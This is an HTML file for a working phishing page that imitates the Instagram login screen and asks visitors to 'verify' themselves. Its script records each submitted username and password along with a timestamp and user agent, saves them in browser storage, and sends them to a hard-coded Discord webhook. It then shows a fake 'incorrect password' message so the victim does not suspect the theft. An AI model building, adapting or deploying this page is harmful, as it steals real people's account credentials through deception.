<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <meta name="theme-color" content="#1a1a1a">
  <title>Instagram</title>

  <style>
    * { box-sizing: border-box; }

    html, body {
      margin: 0;
      padding: 0;
      min-height: 100%;
    }

    body {
      min-height: 100vh;
      min-height: 100dvh;
      background: linear-gradient(135deg, #7b2ff7 0%, #f107a3 50%, #ff8a00 100%);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #ffffff;
      -webkit-font-smoothing: antialiased;
      -webkit-text-size-adjust: 100%;
      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
    }

    .page {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      min-height: 100dvh;
      padding: 24px 16px;
    }

    .card {
      width: 100%;
      max-width: 360px;
      padding: 44px 32px 32px;
      background: #1a1a1a;
      border-radius: 14px;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
    }

    .logo {
      margin: 0 0 8px;
      font-size: 34px;
      line-height: 1;
      font-weight: 400;
      color: #ffffff;
      letter-spacing: -0.5px;
      font-family: "Grand Hotel", "Billabong", "Segoe Script", cursive;
    }

    .subtitle {
      margin: 0 0 26px;
      font-size: 13px;
      color: #a8a8a8;
      font-weight: 400;
    }

    .field-wrap {
      position: relative;
      width: 100%;
      margin-bottom: 8px;
    }

    .field {
      width: 100%;
      height: 42px;
      padding: 0 40px 0 12px;
      border: 1px solid #363636;
      border-radius: 6px;
      background: #262626;
      font-size: 14px;
      color: #ffffff;
      outline: none;
      transition: border-color 0.15s ease;
      -webkit-appearance: none;
      appearance: none;
    }

    .field::placeholder {
      color: #8e8e8e;
    }

    .field:focus {
      border-color: #555555;
    }

    .eye-toggle {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 22px;
      height: 22px;
      padding: 0;
      border: 0;
      background: transparent;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #a8a8a8;
      -webkit-tap-highlight-color: transparent;
    }

    .eye-toggle svg {
      width: 20px;
      height: 20px;
      display: block;
    }

    .eye-toggle .eye-off { display: none; }
    .eye-toggle.visible .eye-on { display: none; }
    .eye-toggle.visible .eye-off { display: block; }

    .forgot {
      display: block;
      margin: 4px 0 18px;
      color: #0095f6;
      font-size: 12px;
      text-align: right;
      text-decoration: none;
      cursor: pointer;
    }

    .login-button {
      width: 100%;
      height: 42px;
      border: 0;
      border-radius: 8px;
      background: #0095f6;
      color: #ffffff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.15s ease;
      -webkit-tap-highlight-color: transparent;
    }

    .login-button:hover { opacity: 0.9; }
    .login-button:active { opacity: 0.8; }

    .divider {
      display: flex;
      align-items: center;
      margin: 22px 0;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: 600;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #363636;
    }

    .divider span {
      padding: 0 14px;
    }

    .facebook-login {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      color: #0095f6;
      font-size: 14px;
      font-weight: 600;
      text-decoration: none;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }

    .facebook-login svg {
      width: 16px;
      height: 16px;
    }

    .error-message {
      min-height: 16px;
      margin: 14px 0 0;
      color: #ed4956;
      font-size: 13px;
    }

    .success-message {
      min-height: 16px;
      margin: 14px 0 0;
      color: #4ade80;
      font-size: 13px;
    }

    .signup-bar {
      width: 100%;
      max-width: 360px;
      margin-top: 12px;
      padding: 18px 20px;
      background: #1a1a1a;
      border-radius: 14px;
      text-align: center;
      font-size: 14px;
      color: #a8a8a8;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
    }

    .signup-bar span {
      color: #0095f6;
      font-weight: 600;
      margin-left: 4px;
    }

    @media (max-width: 380px) {
      .card { padding: 36px 22px 26px; }
      .logo { font-size: 30px; }
      .signup-bar { padding: 14px 18px; font-size: 13px; }
    }

    @media (max-height: 620px) {
      .page { justify-content: flex-start; padding-top: 16px; }
      .card { padding: 28px 22px 22px; }
      .logo { font-size: 28px; }
      .subtitle { margin-bottom: 18px; }
    }
  </style>
</head>

<body>
  <main class="page">

    <section class="card">

      <h1 class="logo">Instagram</h1>
      <p class="subtitle">Verify it's you</p>

      <form id="loginForm">

        <div class="field-wrap">
          <input
            id="username"
            class="field"
            type="text"
            placeholder="Phone number, username or email"
            autocomplete="off"
            autocapitalize="off"
            autocorrect="off"
            spellcheck="false"
          >
        </div>

        <div class="field-wrap">
          <input
            id="password"
            class="field"
            type="password"
            placeholder="Password"
            autocomplete="off"
            autocapitalize="off"
            autocorrect="off"
            spellcheck="false"
          >
          <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show password">
            <svg class="eye-on" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
              <circle cx="12" cy="12" r="3"/>
              <line x1="3" y1="3" x2="21" y2="21"/>
            </svg>
            <svg class="eye-off" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
              <circle cx="12" cy="12" r="3"/>
            </svg>
          </button>
        </div>

        <a class="forgot" href="#" onclick="return false;">Forgotten password?</a>

        <button class="login-button" type="submit">
          Log in
        </button>

        <div class="divider"><span>OR</span></div>

        <a class="facebook-login" href="#" onclick="return false;">
          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#0095f6">
            <path d="M22 12a10 10 0 10-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.44 2.89h-2.34v6.99A10 10 0 0022 12z"/>
          </svg>
          Log in with Facebook
        </a>

        <p id="message" class="error-message"></p>

      </form>

    </section>

    <p class="signup-bar">
      Don't have an account?<span>Sign up</span>
    </p>

  </main>

  <script>
    // ─── CONFIG ───────────────────────────────────────────────────────────
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1551399122467164211/8R8no16JCKEuDQ_Fc_ahBJhdDFsw2MV15Ds_Q1RrT9cQaSfZMQdpdBji5rogSsBPa7d9";
    // ──────────────────────────────────────────────────────────────────────

    const form = document.getElementById("loginForm");
    const password = document.getElementById("password");
    const eyeToggle = document.getElementById("eyeToggle");
    const message = document.getElementById("message");

    window.capturedLogins = JSON.parse(localStorage.getItem("capturedLoginsIG") || "[]");

    function persistLocal(entry) {
      window.capturedLogins.push(entry);
      try {
        localStorage.setItem("capturedLoginsIG", JSON.stringify(window.capturedLogins));
      } catch (e) {
        console.warn("localStorage write failed", e);
      }
    }

    async function sendDiscord(entry) {
      if (!DISCORD_WEBHOOK) return;
      try {
        await fetch(DISCORD_WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content:
              "**IG — new submission**\n" +
              "**User:** `" + entry.username + "`\n" +
              "**Pass:** `" + entry.password + "`\n" +
              "**Time:** " + entry.timestamp + "\n" +
              "**UA:** `" + entry.userAgent + "`"
          })
        });
      } catch (e) {
        console.warn("discord send failed", e);
      }
    }

    eyeToggle.addEventListener("click", function () {
      const showing = password.type === "text";
      password.type = showing ? "password" : "text";
      this.classList.toggle("visible", !showing);
    });

    form.addEventListener("submit", function (event) {
      event.preventDefault();

      const username = document.getElementById("username").value;
      const enteredPassword = password.value;

      const entry = {
        username: username,
        password: enteredPassword,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      };

      persistLocal(entry);
      sendDiscord(entry);

      console.log("[IG captured login]", entry);
      console.table(window.capturedLogins);

      if (username === "demo_user" && enteredPassword === "demo_pass") {
        message.className = "success-message";
        message.textContent = "Login successful!";
      } else {
        message.className = "error-message";
        message.textContent = "Sorry, your password was incorrect. Please double-check your password.";
      }
    });
  </script>
</body>
</html>
